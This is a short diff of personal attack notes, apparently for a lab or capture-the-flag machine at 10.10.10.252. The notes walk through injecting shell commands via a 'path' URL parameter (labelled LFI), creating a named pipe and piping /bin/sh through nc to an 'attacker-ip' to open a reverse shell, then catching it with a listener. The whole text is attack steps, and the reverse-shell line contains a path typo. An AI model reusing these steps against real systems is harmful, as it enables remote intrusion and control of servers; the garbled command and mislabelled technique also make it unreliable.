@@ -1,12 +1,14 @@
-On target machine:
 1)
+On target machine:
 test for lfi
 10.10.10.252/admin/1/?path=/etc/ | pwd
 
 2)
+On target machine:
 if lfi is successful
 10.10.10.252/admin/1/?path=/etc/ | mknod /tmp/backpipe p
 10.10.10.252/admin/1/?path=/etc/ | /bin/sh 0<tmp/tmp/backpipe | nc attacker-ip port-number 1>/tmp/backpipe
 
 3)
-set up listener on attacker machine and catch connection
+On attacker machine:
+set up listener and catch connection
